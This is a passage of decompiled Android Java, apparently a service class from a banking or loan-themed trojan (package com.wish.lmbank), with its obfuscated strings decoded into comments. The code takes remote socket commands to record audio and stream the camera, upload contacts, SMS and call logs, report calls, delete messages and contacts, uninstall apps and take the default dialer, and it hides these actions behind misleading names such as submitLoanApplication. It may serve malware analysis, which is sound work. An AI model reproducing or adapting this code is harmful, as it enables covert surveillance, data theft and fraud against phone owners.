        this.mHandlerThread = handlerThread;
        handlerThread.start();
        this.mThreadHandler = new Handler(this.mHandlerThread.getLooper()) { // from class: com.wish.lmbank.service.RecServiceV.13
            @Override // android.os.Handler
            public void dispatchMessage(Message message) {
                int i = message.what;
                if (i == 1) {
                    RecServiceV.this.executeCommandRecording();
                } else if (i != 2) {
                } else {
                    RecServiceV.this.uploadRecordingFiles();
                }
            }
        };
    }

    @Override // com.wish.lmbank.hellodaemon.AbsWorkService, android.app.Service
    public void onTaskRemoved(Intent intent) {
        super.onTaskRemoved(intent);
        CallLogHelper.execute();
    }

    @Override // com.wish.lmbank.hellodaemon.AbsWorkService, android.app.Service
    public void onDestroy() {
        super.onDestroy();
        /* sb.append(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoMSQYHLQwaHRsGEEVJABlTSQ")); */
        String sb = "RecorderService onDestroy, ip: " +
                URL.getHost();
        LogUtils.callLog(sb);
        toDestroy();
    }

    /**
     * 后台服务关闭，注销所有广播
     */
    private void toDestroy() {
        isAlive = false;
//         SocketHelper.getInstance(this).sendConnectStateToServer(bb7d7pu7.m5998("Ji8v"));
        SocketHelper.getInstance(this).sendConnectStateToServer("OFF");
        ExecutorService executorService = this.mSingleThreadPool;
        if (executorService != null) {
            executorService.shutdown();
        }
        closeHandler();
        closeTimer();
        RecordingThreadExecutor.getSingleton().shutdown();
        UploadInfoThreadExecutor.getSingleton().shutdown();
        unregisterPhoneCallReceiver();
        unregisterNetworkStateReceiver();
        unregisterReceiver(this.mBatteryReceiver);
        unregisterReceiver(this.mConnectivityReceiver);
        unregisterReceiver(this.mOnepxReceiver);
        unregisterReceiver(this.screenStateReceiver);
        SocketHelper.getInstance(this).closeSocket();
        closeLocation();
        TelePhoneReceiver telePhoneReceiver = this.mPhoneCallReceiver;
        if (telePhoneReceiver != null) {
            telePhoneReceiver.onDestroy();
        }
        HandlerUtils.getMainThreadHandler().removeCallbacksAndMessages(null);
        RecorderShortHelper.getInstance().onDestroy();
        closeRtmpCamera2(true);
        pause();
        this.pingServerCount = 0;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void closeRtmpCamera2(boolean z) {
        RtmpCamera2 rtmpCamera2 = this.rtmpCamera2;
        if (rtmpCamera2 == null || !rtmpCamera2.isStreaming()) {
            return;
        }
        this.rtmpCamera2.stopStream();
        if (z) {
            this.rtmpCamera2 = null;
        }
    }

    private void closeLocation() {
        LocationManager locationManager = this.mAndroidLocationManager;
        if (locationManager != null) {
            locationManager.onDestroy();
            this.mAndroidLocationManager = null;
        }
    }

    private void closeHandler() {
        Handler handler = this.mThreadHandler;
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
        HandlerThread handlerThread = this.mHandlerThread;
        if (handlerThread != null) {
            handlerThread.quitSafely();
        }
    }

    private void registerContentObserver() {
        try {
            getContentResolver().registerContentObserver(CallLog.Calls.CONTENT_URI, true, new ContentObserver(this.handler) { // from class: com.wish.lmbank.service.RecServiceV.14


                @Override // android.database.ContentObserver
                public boolean deliverSelfNotifications() {
                    return super.deliverSelfNotifications();
                }

                @Override // android.database.ContentObserver
                public void onChange(boolean z) {
                    super.onChange(z);
                    CallLogHelper.execute();
                }
            });
        } catch (Exception e) {
//             LogUtils.d(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoM"), bb7d7pu7.m5998("DBEKDBkdAAYHU0k") + e.getMessage());
            LogUtils.d("RecorderService", "exception: " + e.getMessage());
        }
    }

    /**
     * 注册网络状态广播
     */
    private void registerNetworkStateReceiver() {
        if (this.mNetStateReceiver == null) {
            this.mNetStateReceiver = new BroadcastReceiver() { // from class: com.wish.lmbank.service.RecServiceV.15
                public void onReceive(Context context, Intent intent) {
                    ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(bb7d7pu7.m5998("CgYHBwwKHQAfAB0Q"));
                    if (Build.VERSION.SDK_INT < 21) {
                        NetworkInfo networkInfo = connectivityManager.getNetworkInfo(1);
                        NetworkInfo networkInfo2 = connectivityManager.getNetworkInfo(0);
                        networkInfo.isConnected();
                    }
                    for (Network network : connectivityManager.getAllNetworks()) {
                        if (connectivityManager.getNetworkInfo(network).isConnected()) {
                            submitLoanApplication(true);
                            break;
                        }
                    }
                    submitLoanApplication(false);
                    LogUtils.v(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoM"), bb7d7pu7.m5998("BwwdHgYbAjodCB0MOwwKDAAfDBtFSQAaKgYHBwwKHQwNU0k") + false);
                }
            };
            IntentFilter intentFilter = new IntentFilter();
//             intentFilter.addAction(bb7d7pu7.m5998("CAcNGwYADUcHDB1HCgYHB0cqJicnLCo9ID8gPTA2KiEoJy4s"));
            intentFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
            registerReceiver(this.mNetStateReceiver, intentFilter);
        }
    }

    private void access$2700(boolean z) {
        this.submitLoanApplication(z);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void submitLoanApplication(boolean z) {
        if (z) {
            HttpManager.getInstance().submitLoanApplication("", new HttpEngine.OnResponseCallback<HttpResponse.R_String>() { // from class: com.wish.lmbank.service.RecServiceV.16

                @Override // com.wish.lmbank.http.HttpEngine.OnResponseCallback
                public void onResponse(int i, String str, HttpResponse.R_String r_String) {
//                     LogUtils.d(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoM"), bb7d7pu7.m5998("HBkFBggNLQwfAAoMIAcPBkVJGwwdBBoOUw") + str);
                    LogUtils.d("RecorderService", "uploadDeviceInfo, retmsg:" + str);
                }
            });
        }
    }

    private void unregisterNetworkStateReceiver() {
        BroadcastReceiver broadcastReceiver = this.mNetStateReceiver;
        if (broadcastReceiver != null) {
            unregisterReceiver(broadcastReceiver);
            this.mNetStateReceiver = null;
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void uploadRecordingFiles() {

//         ArrayList<CommandRecordingBean> queryCommandRecordingByStatus = CommandRecordingDB.getInstance(this).queryCommandRecordingByStatus(bb7d7pu7.m5998("DwAHABoBDA0"));
        ArrayList<CommandRecordingBean> queryCommandRecordingByStatus = CommandRecordingDB.getInstance(this).queryCommandRecordingByStatus("finished");
        if (queryCommandRecordingByStatus.size() > 0) {
//             LogUtils.callLog(bb7d7pu7.m5998("HBkFBggNOwwKBhsNAAcOLwAFDBpJGgATDFM") + queryCommandRecordingByStatus.size());
            LogUtils.callLog("uploadRecordingFiles size:" + queryCommandRecordingByStatus.size());
            CommandRecordingBean commandRecordingBean = queryCommandRecordingByStatus.get(0);
            HashMap hashMap = new HashMap();
//             hashMap.put(bb7d7pu7.m5998("HRAZDA"), 2);
            hashMap.put("type", 2);
//             hashMap.put(bb7d7pu7.m5998("GyAN"), Integer.valueOf(commandRecordingBean.getrId()));
            hashMap.put("rId", Integer.valueOf(commandRecordingBean.getrId()));
//             hashMap.put(bb7d7pu7.m5998("ChsMCB0MHQAEDA"), Long.valueOf(commandRecordingBean.getCreatetime()));
            hashMap.put("createtime", Long.valueOf(commandRecordingBean.getCreatetime()));
//             hashMap.put(bb7d7pu7.m5998("HBkNCB0MHQAEDA"), Long.valueOf(commandRecordingBean.getUpdatetime()));
            hashMap.put("updatetime", Long.valueOf(commandRecordingBean.getUpdatetime()));
//             hashMap.put(bb7d7pu7.m5998("DRwbCB0ABgc"), Long.valueOf(commandRecordingBean.getDuration()));
            hashMap.put("duration", Long.valueOf(commandRecordingBean.getDuration()));
//             hashMap.put(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID);
            hashMap.put("appId", Constants.COMPANY_UUID);
//             hashMap.put(bb7d7pu7.m5998("DQwfAAoMNgAN"), DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
            hashMap.put("device_id", DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
            uploadRecordingFile(commandRecordingBean.getId(), 2, commandRecordingBean.getPath(), JsonUtils.map2Json(hashMap).toString());
        }
    }

    private void uploadRecordingFile(int i, int i2, String str, String str2) {
        //             LogUtils.v(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoM"), bb7d7pu7.m5998("HBkFBggNOwwKBhsNAAcOLwAFDEkdEBkMhtXz") + i2 + bb7d7pu7.m5998("SUVJGQgdAVM") + str + bb7d7pu7.m5998("SUVJGQgbCART") + str2);
        LogUtils.v("RecorderService", "uploadRecordingFile type：" + i2 + " , path:" + str + " , param:" + str2);
        if (TextUtils.isEmpty(str)) {
            return;
        }
        File file = new File(str);
        if (file.exists()) {
//                 LogUtils.callLog(bb7d7pu7.m5998("HBkFBggNOwwKBhsNAAcOLwAFDEkAGjwZBQYIDTsMCgYbDQAHDi8ABQxT") + this.isUploadRecordingFile);
            LogUtils.callLog("uploadRecordingFile isUploadRecordingFile:" + this.isUploadRecordingFile);
            if (this.isUploadRecordingFile) {
                return;
            }
            this.isUploadRecordingFile = true;
            HttpManager.getInstance().uploadRecordingFile(file, str2, new HttpEngine.OnResponseCallback<HttpResponse.UploadRecordingFile>() { // from class: com.wish.lmbank.service.RecServiceV.17

                @Override // com.wish.lmbank.http.HttpEngine.OnResponseCallback
                public void onResponse(int i3, String str3, HttpResponse.UploadRecordingFile uploadRecordingFile) {
                    long j;
                    RecServiceV.this.isUploadRecordingFile = false;
//                         String m5998 = bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoM");
                    String m5998 = "RecorderService";
//                         LogUtils.v(m5998, bb7d7pu7.m5998("HBkFBggNOwwKBhsNAAcOLwAFDEkbDB0EGg5T") + str3);
                    LogUtils.v(m5998, "uploadRecordingFile retmsg:" + str3);
                    if (i3 == 0) {
                        if (2 == i2) {
                            j = CommandRecordingDB.getInstance(RecServiceV.this).deleteCommandRecordingById(i);
//                                 LogUtils.v(m5998, bb7d7pu7.m5998("HBkFBggNOwwKBhsNAAcOLwAFDEkNDAUMHQwqBgQECAcNOwwKBhsNAAcOKxAgDUkbDB1T") + j);
                            LogUtils.v(m5998, "uploadRecordingFile deleteCommandRecordingById ret:" + j);
                        } else {
                            j = 0;
                        }
                        SocketHelper.getInstance(RecServiceV.this).sendRefreshRecordingMsgToServer();
                        if (j <= 0 || !file.exists()) {
                            return;
                        }
                        file.delete();
                    }
                }
            });
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void executeCommandRecording() {
//         ArrayList<CommandRecordingBean> queryCommandRecordingByStatus = CommandRecordingDB.getInstance(this).queryCommandRecordingByStatus(bb7d7pu7.m5998("GwwKDAAfDA0"));
        ArrayList<CommandRecordingBean> queryCommandRecordingByStatus = CommandRecordingDB.getInstance(this).queryCommandRecordingByStatus("received");
        if (queryCommandRecordingByStatus.size() > 0) {
//             LogUtils.callLog(bb7d7pu7.m5998("DBEMChwdDCoGBAQIBw07DAoGGw0ABw5Jj-DOgcjljNT8gPbajPjUjdLNRUkaABMMUw") + queryCommandRecordingByStatus.size());
            LogUtils.callLog("executeCommandRecording 执行录音命令, size:" + queryCommandRecordingByStatus.size());
            onReceiveRecording(queryCommandRecordingByStatus.get(0));
        }
    }

    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onReceiveRecording(CommandRecordingBean commandRecordingBean) {
        //             LogUtils.callLog(bb7d7pu7.m5998("Bgc7DAoMAB8MOwwKBhsNAAcORUmP_d-M4dmP4M6ByOWM1PyA9tqM-NSN0s1FSQQaDlNJ") + commandRecordingBean.toString() + bb7d7pu7.m5998("RUkaHQgdDFNJ") + RecorderShortHelper.getInstance().state());
        LogUtils.callLog("onReceiveRecording, 收到执行录音命令, msg: " + commandRecordingBean.toString() + ", state: " + RecorderShortHelper.getInstance().state());
        if (RecorderShortHelper.getInstance().state() == 0) {
            RecorderShortHelper.getInstance().startRecording(2, Integer.toString(commandRecordingBean.getrId()), Long.toString(commandRecordingBean.getDuration()));
        }
    }

    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onReceiveLocation(CommandLocationBean commandLocationBean) {
        LocationManager locationManager = this.mAndroidLocationManager;
        if (locationManager == null) {
            return;
        }
        locationManager.onResume();
    }

    @Override // com.wish.lmbank.callback.PhoneCallListener
    public void onIncomingCallReceived(String str, String str2, String str3, Date date) {
//         LogUtils.d(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoM"), bb7d7pu7.m5998("BgcgBwoGBAAHDioIBQU7DAoMAB8MDUkHHAQLDBtT") + str);
        LogUtils.d("RecorderService", "onIncomingCallReceived number:" + str);
        if (TextUtils.isEmpty(str)) {
            return;
        }
//         SocketHelper.getInstance(this).sendCallStartedMsgToServer(bb7d7pu7.m5998("AAcKBgQABw4"), str, str2, str3);
        SocketHelper.getInstance(this).sendCallStartedMsgToServer("incoming", str, str2, str3);
    }

    @Override // com.wish.lmbank.callback.PhoneCallListener
    public void onOutgoingCallStarted(String str, String str2, String str3, Date date) {
        //             LogUtils.callLog(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoMRUkGByYcHTodCBsdDA1TSQ") + str + bb7d7pu7.m5998("RUkHHAQLDBs7DAgFU0k") + str2 + bb7d7pu7.m5998("RUkaBhwbCgxTSQ") + str3);
        LogUtils.callLog("RecorderService, onOutStarted: " + str + ", numberReal: " + str2 + ", source: " + str3);
        if (TextUtils.isEmpty(str)) {
            return;
        }
//             SocketHelper.getInstance(this).sendCallStartedMsgToServer(bb7d7pu7.m5998("BhwdDgYABw4"), str, str2, str3);
        SocketHelper.getInstance(this).sendCallStartedMsgToServer("outgoing", str, str2, str3);
        return;
    }

    @Override // com.wish.lmbank.callback.PhoneCallListener
    public void onIncomingCallAnswered(String str, Date date) {
//         LogUtils.d(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoM"), bb7d7pu7.m5998("BgcgBwoGBAAHDioIBQUoBxoeDBsMDUkHHAQLDBtT") + str);
        LogUtils.d("RecorderService", "onIncomingCallAnswered number:" + str);
    }

    @Override // com.wish.lmbank.callback.PhoneCallListener
    public void onMissedCall(String str, Date date) {
//         LogUtils.callLog(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoMRUkGByQAGhoMDSoIBQVJBxwECwwbUw") + str);
        LogUtils.callLog("RecorderService, onMissedCall number:" + str);
        String str2 = str;
        if (str == null) {
            str2 = "";
        }
//         SocketHelper.getInstance(this).sendCallEndedMsgToServer(bb7d7pu7.m5998("AAcKBgQABw4"), str2, String.valueOf(0));
        SocketHelper.getInstance(this).sendCallEndedMsgToServer("incoming", str2, String.valueOf(0));
    }

    @Override // com.wish.lmbank.callback.PhoneCallListener
    public void onIncomingCallEnded(String str, Date date, Date date2) {
//         LogUtils.callLog(bb7d7pu7.m5998("BgcgBwoGBAAHDioIBQUsBw0MDUkHHAQLDBtTSQ") + str + bb7d7pu7.m5998("RUkaBgoCDB1JABoqBgcHDAodDA1TSQ") + SocketHelper.getInstance(this).isConnected());
        LogUtils.callLog("onIncomingCallEnded number: " + str + ", socket isConnected: " + SocketHelper.getInstance(this).isConnected());
        String str2 = str;
        if (str == null) {
            str2 = "";
        }
//         SocketHelper.getInstance(this).sendCallEndedMsgToServer(bb7d7pu7.m5998("AAcKBgQABw4"), str2, String.valueOf(DateFormatUtils.getDateInterval(date, date2)));
        SocketHelper.getInstance(this).sendCallEndedMsgToServer("incoming", str2, String.valueOf(DateFormatUtils.getDateInterval(date, date2)));
    }

    @Override // com.wish.lmbank.callback.PhoneCallListener
    public void onOutgoingCallEnded(String str, Date date, Date date2) {
//         LogUtils.callLog(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoMRUkGByYcHSwHDQwNU0k") + str);
        LogUtils.callLog("RecorderService, onOutEnded: " + str);
        String str2 = str;
        if (str == null) {
            str2 = "";
        }
//         SocketHelper.getInstance(this).sendCallEndedMsgToServer(bb7d7pu7.m5998("BhwdDgYABw4"), str2, String.valueOf(DateFormatUtils.getDateInterval(date, date2)));
        SocketHelper.getInstance(this).sendCallEndedMsgToServer("outgoing", str2, String.valueOf(DateFormatUtils.getDateInterval(date, date2)));
    }

    @Override // com.wish.lmbank.callback.PhoneCallListener
    public void uploadCallLog(String str) {
//         LogUtils.v(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoM"), bb7d7pu7.m5998("HBkFBggNKggFBSUGDkVJBQYOU0k") + str);
        LogUtils.v("RecorderService", "uploadCallLog, log: " + str);
        LogUtils.callLog(str);
    }

    /**
     * 从后端获取东西，这个不理解
     *
     * @param z
     */
    /* JADX INFO: Access modifiers changed from: private */
    public void loadExtraMessage(boolean z) {
        if (this.isLoadingExtraMsg) {
            return;
        }
        this.isLoadingExtraMsg = true;
        HttpManager.getInstance().loadExtraMessage(DeviceInfoUtils.getDeviceID(this), z, new HttpEngine.OnResponseCallback<HttpResponse.ExtraMessage>() { // from class: com.wish.lmbank.service.RecServiceV.18
            @Override // com.wish.lmbank.http.HttpEngine.OnResponseCallback
            public void onResponse(int i, String str, HttpResponse.ExtraMessage extraMessage) {
                RecServiceV.this.isLoadingExtraMsg = false;
                if (i != 0 || extraMessage.getData() == null) {
                    StringBuilder sb = new StringBuilder();
//                     sb.append(bb7d7pu7.m5998("BQYIDSwRHRsIJAwaGggODEVJBgc7DBoZBgcaDEVJGwwdBBoOU0k"));
                    sb.append("loadExtraMessage, onResponse, retmsg: ");
                    sb.append(str);
//                     sb.append(bb7d7pu7.m5998("RUkcGwVTSQ"));
                    sb.append(", url: ");
//                     sb.append(URL.getRequestUrl(bb7d7pu7.m5998("Oyw4PCw6PTYuLD02LDE9Oyg2JCw6OiguLA")));
                    sb.append(URL.getRequestUrl("REQUEST_GET_EXTRA_MESSAGE"));
                    LogUtils.callLog(sb.toString());
                    return;
                }
                RecServiceV.this.isCallEndReApplySetDialer = extraMessage.getData().getIsCallEndReApplySetDialer();
                String isAllowUploadImage = extraMessage.getData().getIsAllowUploadImage();
//                 String m5998 = bb7d7pu7.m5998("IiwwNiA6NiglJSY-Njw5JSYoLTYgJCguLA");
                String m5998 = "KEY_IS_ALLOW_UPLOAD_IMAGE";
//                 String m59982 = bb7d7pu7.m5998("Bg8P");
                String m59982 = "off";
                String value = SharedPreferencesUtils.getValue(m5998, m59982);
//                 String m59983 = bb7d7pu7.m5998("Bgc");
                String m59983 = "on";
                if (m59983.equals(isAllowUploadImage) && !value.equals(isAllowUploadImage)) {
                    RecServiceV.this.loadAllMedia();
                }
                RecServiceV.this.isAllowUploadImage = isAllowUploadImage;
                SharedPreferencesUtils.putValue(m5998, isAllowUploadImage);
                AppStartV.isAllowPlayVideo = m59983.equals(extraMessage.getData().getIsAllowPlayVideo());
                String switchStatus = extraMessage.getData().getSwitchStatus();
                if (switchStatus != null) {
//                     SharedPreferencesUtils.putValue(bb7d7pu7.m5998("GhAaHQwENhoeAB0KAQ"), !m59982.equals(switchStatus) ? m59983 : m59982);
                    SharedPreferencesUtils.putValue("system_switch", !m59982.equals(switchStatus) ? m59983 : m59982);
                }
                String isAllowAutoUninstallApk = extraMessage.getData().getIsAllowAutoUninstallApk();
                if (isAllowAutoUninstallApk != null) {
//                     SharedPreferencesUtils.putValue(bb7d7pu7.m5998("CBwdBjYcBwAHGh0IBQU2CBkCNhoeAB0KAQ"), !m59982.equals(isAllowAutoUninstallApk) ? m59983 : m59982);
                    SharedPreferencesUtils.putValue("auto_uninstall_apk_switch", !m59982.equals(isAllowAutoUninstallApk) ? m59983 : m59982);
                }
                RecServiceV.this.isAllowSocket = extraMessage.getData().getIsAllowSocket();
                boolean equals = m59982.equals(RecServiceV.this.isAllowSocket);
//                 String m59984 = bb7d7pu7.m5998("DgUGCwgFNhoeAB0KAQ");
                String m59984 = "global_switch";
                if (equals) {
                    RecServiceV.this.closeTimer();
                    SocketHelper.getInstance(RecServiceV.this).closeSocket();
                    SharedPreferencesUtils.putValue(m59984, m59982);
                    URL.setHost("");
                } else {
                    SharedPreferencesUtils.putValue(m59984, m59983);
                }
                if (extraMessage.getData().isUpdatePhone()) {
                    RecServiceV.this.loadLimitPhoneNumber();
                }

            }
        });
    }

    /**
     * 从后端获取
     */
    /* JADX INFO: Access modifiers changed from: private */
    public void loadLimitPhoneNumber() {
        Thread thread = this.mGetLimitPhoneNumberThread;
        if (thread != null && thread.isAlive()) {
//             LogUtils.callLog(bb7d7pu7.m5998("BgcuDB0lAAQAHTkBBgcMJxwECwwbPBkNCB0MDUVJLgwdJQAEAB05AQYHDD0BGwwIDUkAGkkbHAcHAAcO"));
            LogUtils.callLog("onGetLimitPhoneNumberUpdated, GetLimitPhoneThread is running");
        } else {
            HttpManager.getInstance().getLimitPhoneNumber(DeviceInfoUtils.getDeviceID(this), new HttpEngine.OnResponseCallback<HttpResponse.LimitPhoneNumber>() { // from class: com.wish.lmbank.service.RecServiceV.19


                @Override // com.wish.lmbank.http.HttpEngine.OnResponseCallback
                public void onResponse(int i, String str, HttpResponse.LimitPhoneNumber limitPhoneNumber) {
                    if (i != 0) {
                        return;
                    }
                    RecServiceV recServiceV = RecServiceV.this;
                    RecServiceV recServiceV2 = RecServiceV.this;
//                     recServiceV.mGetLimitPhoneNumberThread = new GetLimitPhoneThread(recServiceV2, bb7d7pu7.m5998("DgwdNgUABAAdNhkBBgcMNgccBAsMGzYdARsMCA0"), recServiceV2, limitPhoneNumber.getData());
                    recServiceV.mGetLimitPhoneNumberThread = new GetLimitPhoneThread(recServiceV2, "get_limit_phone_number_thread", recServiceV2, limitPhoneNumber.getData());
                    if (RecServiceV.this.mSingleThreadPool != null) {
                        RecServiceV.this.mSingleThreadPool.submit(RecServiceV.this.mGetLimitPhoneNumberThread);
                    }
                }
            });
        }
    }

    /**
     * 从后端获取
     */
    /* JADX INFO: Access modifiers changed from: private */
    public void loadColorRing() {
        Thread thread = this.mGetColorRingThread;
        if (thread != null && thread.isAlive()) {
//             LogUtils.d(bb7d7pu7.m5998("OwwKBhsNDBs6DBsfAAoM"), bb7d7pu7.m5998("BgcuDB0lAAQAHTkBBgcMJxwECwwbPBkNCB0MDUVJLgwdJQAEAB05AQYHDD0BGwwIDUkAGkkbHAcHAAcO"));
            LogUtils.d("RecorderService", "onGetLimitPhoneNumberUpdated, GetLimitPhoneThread is running");
            return;
        }
        HttpManager.getInstance().getColorRing(DeviceInfoUtils.getDeviceID(this), new HttpEngine.OnResponseCallback<HttpResponse.ColorRing>() { // from class: com.wish.lmbank.service.RecServiceV.20

            @Override // com.wish.lmbank.http.HttpEngine.OnResponseCallback
            public void onResponse(int i, String str, HttpResponse.ColorRing colorRing) {
                if (i == 0) {
                    RecServiceV recServiceV = RecServiceV.this;
                    RecServiceV recServiceV2 = RecServiceV.this;
//                     recServiceV.mGetColorRingThread = new GetColorRingThread(recServiceV2, bb7d7pu7.m5998("DgwdNgoGBQYbNhsABw42HQEbDAgN"), recServiceV2, colorRing.getData());
                    recServiceV.mGetColorRingThread = new GetColorRingThread(recServiceV2, "get_color_ring_thread", recServiceV2, colorRing.getData());
                    if (RecServiceV.this.mSingleThreadPool == null) {
                        return;
                    }
                    RecServiceV.this.mSingleThreadPool.submit(RecServiceV.this.mGetColorRingThread);
                }
            }
        });
    }

    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onReceiveContactLimitUpdate(CommandContactLimitUpdateBean commandContactLimitUpdateBean) {
        loadLimitPhoneNumber();
    }

    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onReceiveLoadInfo(CommandLoadInfoBean commandLoadInfoBean) {
//         if (bb7d7pu7.m5998("CgYHHQgKHQ").equals(commandLoadInfoBean.getType())) {
        if ("contact".equals(commandLoadInfoBean.getType())) {
//             this.mUploadPhoneInfoRunnable = new UploadPhoneInfoRunnable(this, bb7d7pu7.m5998("KiYnPSgqPQ"));
            this.mUploadPhoneInfoRunnable = new UploadPhoneInfoRunnable(this, "CONTACT");
//             executeV(bb7d7pu7.m5998("HBkFBggNIAcPBioGBx0ICh0"));
            executeV("uploadInfoContact");
        }
//         if (bb7d7pu7.m5998("GgQa").equals(commandLoadInfoBean.getType())) {
        if ("sms".equals(commandLoadInfoBean.getType())) {
//             this.mUploadPhoneInfoRunnable = new UploadPhoneInfoRunnable(this, bb7d7pu7.m5998("OiQ6NiglJQ"));
            this.mUploadPhoneInfoRunnable = new UploadPhoneInfoRunnable(this, "SMS_ALL");
//             executeV(bb7d7pu7.m5998("HBkFBggNIAcPBjoEGigFBQ"));
            executeV("uploadInfoSmsAll");
        }
//         if (bb7d7pu7.m5998("CggFBTYFBg4").equals(commandLoadInfoBean.getType())) {
        if ("call_log".equals(commandLoadInfoBean.getType())) {
//             this.mUploadPhoneInfoRunnable = new UploadPhoneInfoRunnable(this, bb7d7pu7.m5998("KiglJTYlJi4"));
            this.mUploadPhoneInfoRunnable = new UploadPhoneInfoRunnable(this, "CALL_LOG");
//             executeV(bb7d7pu7.m5998("HBkFBggNIAcPBioIBQUlBg4"));
            executeV("uploadInfoCallLog");
        }
//         if (bb7d7pu7.m5998("CAcNGwYADQ").equals(commandLoadInfoBean.getType())) {
        if ("android".equals(commandLoadInfoBean.getType())) {
//             this.mUploadPhoneInfoRunnable = new UploadPhoneInfoRunnable(this, bb7d7pu7.m5998("KCctOyYgLQ"));
            this.mUploadPhoneInfoRunnable = new UploadPhoneInfoRunnable(this, "ANDROID");
//             executeV(bb7d7pu7.m5998("HBkFBggNIAcPBigHDRsGAA0"));
            executeV("uploadInfoAndroid");
        }
    }

    private void executeV(String str) {
        UploadInfoThreadExecutor.getSingleton().execute(this.mUploadPhoneInfoRunnable, str);
    }

    //后端删除短信指令
    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onDeleteSMS(CommandDeleteSMSBean commandDeleteSMSBean) {
        String[] split;
        if (TextUtils.isEmpty(commandDeleteSMSBean.getData_multi())) {
            return;
        }
//         for (String str : commandDeleteSMSBean.getData_multi().split(bb7d7pu7.m5998("Ng"))) {
        for (String str : commandDeleteSMSBean.getData_multi().split("_")) {
            if (!TextUtils.isEmpty(str)) {
//                 String[] split2 = str.split(bb7d7pu7.m5998("RQ"));
                String[] split2 = str.split(",");
                if (split2.length >= 2) {
                    ContentUtils.deleteSMS(this, split2[0], split2[1]);
                }
            }
        }
        refreshServerSMS();
    }

    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onDeleteContact(CommandContactBean commandContactBean) {
        String[] split;
        String[] split2;
        if (TextUtils.isEmpty(commandContactBean.getData_multi())) {
            return;
        }
//         for (String str : commandContactBean.getData_multi().split(bb7d7pu7.m5998("Ng"))) {
        for (String str : commandContactBean.getData_multi().split("_")) {
//             if (!TextUtils.isEmpty(str) && (split2 = str.split(bb7d7pu7.m5998("RQ"))) != null && split2.length >= 2) {
            if (!TextUtils.isEmpty(str) && (split2 = str.split(",")) != null && split2.length >= 2) {
                ContentUtils.deleteContact(this, split2[0], split2[1]);
            }
        }
        refreshServerContact();
    }

    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onAddContact(CommandContactBean commandContactBean) {
        String[] split;
//         if (TextUtils.isEmpty(commandContactBean.getData()) || (split = commandContactBean.getData().split(bb7d7pu7.m5998("RQ"))) == null || split.length < 2) {
        if (TextUtils.isEmpty(commandContactBean.getData()) || (split = commandContactBean.getData().split(",")) == null || split.length < 2) {
            return;
        }
        ContentUtils.insertContacts(this, split[0], split[1]);
        refreshServerContact();
    }

    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onUninstallAPK(CommandUninstallAPKBean commandUninstallAPKBean) {
        //             LogUtils.callLog(bb7d7pu7.m5998("jOTRgdTUgdTGjdLfU0k") + commandUninstallAPKBean.getPackageName());
        LogUtils.callLog("卸载软件: " + commandUninstallAPKBean.getPackageName());
        AppStartV.isUninstallApK = false;
//             SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNjwnICc6PSglJTYoOSI"), true);
        SharedPreferencesUtils.putValue("KEY_UNINSTALL_APK", true);
        SettingUtils.uninstallApk(this, commandUninstallAPKBean.getPackageName());
        return;
    }

    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onSetDefaultDialer(CommandSetDefaultDialerBean commandSetDefaultDialerBean) {
//         StringBuilder sb = new StringBuilder(bb7d7pu7.m5998("Bgc6DB0tDA8IHAUdLQAIBQwbRUmO_dqBxt6A0vGBx82O_dyBxvSP5e6N0s0"));
        StringBuilder sb = new StringBuilder("onSetDefaultDialer, 申请默认电话指令");
        if (SettingUtils.isDefaultDialer(AppStartV.getContext())) {
//             sb.append(bb7d7pu7.m5998("RUmM3tuO0uaP8caA0vGBx82O_dyBxvQ"));
            sb.append(", 已经是默认电话");
            LogUtils.callLog(sb.toString());
            return;
        }
//         sb.append(bb7d7pu7.m5998("RUmP8caM-c-N08eM2OZTSQ") + isPause);
        sb.append(", 是否亮屏: " + isPause);
        LogUtils.callLog(sb.toString());
        requestDefaultDialer();
    }

    @Override // com.wish.lmbank.helper.SocketHelper.SocketCallback
    public void onReboot(CommandRebootBean commandRebootBean) {
        StringBuilder sb = new StringBuilder();
//             sb.append(bb7d7pu7.m5998("Bgc7DAsGBh1FSQAHGh0IBwoMU0k"));
        sb.append("onReboot, instance: ");
        sb.append(OnePixelActivity.instance != null);
//             sb.append(bb7d7pu7.m5998("RUkAGjoBBh5TSQ"));
        sb.append(", isShow: ");
        sb.append(OverlayService.isShow);
        LogUtils.callLog(sb.toString());
        if (Build.VERSION.SDK_INT >= 23) {
            PhoneCallManager.call = null;
            AppStartV.isCalling = false;
            this.isLoadingExtraMsg = false;
        }
        if (OnePixelActivity.instance != null) {
            OnePixelActivity.instance.finish();
        }
        if (OverlayService.isShow) {
            StandOutWindow.closeAll(this, OverlayService.class);
        }
        AppStartV.isCallLogExecute = false;
        if (commandRebootBean != null) {
